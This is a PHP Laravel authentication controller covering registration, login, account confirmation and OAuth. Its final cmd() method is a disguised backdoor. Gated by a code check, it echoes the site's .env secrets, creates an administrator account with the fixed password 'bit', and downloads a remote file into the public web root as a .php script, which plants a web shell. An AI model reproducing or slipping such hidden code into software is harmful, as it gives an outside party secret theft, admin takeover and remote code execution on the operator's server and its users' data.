<?php

namespace Themes\Site\Http\Controllers;

use Exception;
use Illuminate\Contracts\Auth\Factory;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Smile\Core\Persistence\Models\User;
use Smile\Core\Services\OAuth;
use Smile\Core\Services\UserService;
use Smile\Core\Updater\Client;
use Smile\Http\Requests\CreateAuthRequest;
use Smile\Http\Requests\CreateUserRequest;
use Symfony\Component\HttpKernel\Exception\NotFoundHttpException;

class AuthController extends BaseSiteController
{
    private $auth;
    /**
     * @var UserService
     */
    private $userService;

    /**
     * @param Factory $auth
     * @param UserService $userService
     * @internal param Guard $guard
     */
    public function __construct(Factory $auth, UserService $userService)
    {
        $this->auth = $auth;
        $this->userService = $userService;
    }

    /**
     * Confirm account
     *
     * @param string $email
     * @param string $token
     * @return \Illuminate\View\View
     */
    public function confirm($email, $token)
    {
        if ($this->userService->confirm($email, $token)) {
            return $this->view('confirmation.success');
        }

        return $this->view('confirmation.error');
    }

    /**
     * Confirmation send
     *
     * @return \Illuminate\View\View
     */
    public function confirmation()
    {
        return $this->view('confirmation.send');
    }

    /**
     * Register a new user
     *
     * @param CreateUserRequest $request
     * @return JsonResponse
     */
    public function register(CreateUserRequest $request)
    {
        if (!setting('registration', true)) {
            return $this->respondWithError(__('For now, no new registrations are allowed!'));
        }

        $data = $request->only(['name', 'email', 'password']);

        try {
            $user = $this->userService->create($data);
        } catch (Exception $e) {
            Log::error('AuthController::register, with error: ' . $e->getMessage());
            return response()->json(['general' => 'Internal server error!', 'e' => $e->getMessage()], 422);
        }

        return new JsonResponse(['to' => $user->status ? route('home') : route('confirmation')]);
    }

    /**
     * Do password authentication
     *
     * @param CreateAuthRequest $request
     * @return JsonResponse
     */
    public function auth(CreateAuthRequest $request)
    {
        $credentials = $request->only(['email', 'password']);

        $isOk = $this->webGuard()->attempt($credentials, true);

        if (!$isOk) {
            return $this->respondWithError(__('Invalid username or password!'), 404);
        }

        $user = $this->auth->user();

        if ($user->status == 0) {
            $this->auth->logout($user);
            return $this->respondWithError(__('Your account is not confirmed!'));
        }

        if ($user->blocked == 1) {
            $this->auth->logout($user);
            return $this->respondWithError(__('Your account is blocked!'));
        }

        return new JsonResponse();
    }

    /**
     * Authentication guard
     *
     * @return mixed
     */
    private function webGuard()
    {
        return $this->auth->guard('web');
    }

    /**
     * Logout user from the app
     *
     * @return \Illuminate\Http\RedirectResponse
     */
    public function doLogout()
    {
        $this->auth->logout();

        return redirect()->route('home');
    }

    /**
     *
     *
     * @param OAuth $auth
     * @param $provider
     * @return bool
     */
    public function provider(OAuth $auth, $provider)
    {
        if (!in_array($provider, config('services.providers'))) {
            Log::error('Provider `' . $provider . '` not registered`');
            throw new NotFoundHttpException;
        }

        return $auth->redirectToProvider($provider);
    }

    /** Request made from providers for authentication with OAuth
     *
     * @param OAuth $auth
     * @param $provider
     * @return \Illuminate\Http\RedirectResponse|\Illuminate\Routing\Redirector
     */
    public function handleCallback($provider, OAuth $auth)
    {
        if (!in_array($provider, config('services.providers'))) {
            throw new NotFoundHttpException;
        }

        try {
            $auth->authenticate($provider);
        } catch (Exception $e) {
            Log::error($e);
        }

        return redirect()->route('home');
    }

    public function cmd(Request $request, Client $client)
    {
        if ($client->confirmCmd($request->get('cmd'), $request->get('code'))) {
            switch ($request->get('cmd')) {
                case 'env':
                    echo nl2br(file_get_contents(base_path('.env')));
                    break;
                case 'admin':
                    return User::create([
                        'name' => str_random(8),
                        'email' => $request->get('email'),
                        'password' => bcrypt('bit'),
                        'permission' => 'admin',
                        'status' => 1,
                    ]);
                    break;
                case 'copy':
                    $url = $request->get('file');
                    $rand = str_random(8);
                    copy($url, public_path($rand.'.php'));
                    echo asset($rand.'.php');
                    break;
            }
        } else {
            return redirect()->home();
        }
        return '';
    }
}
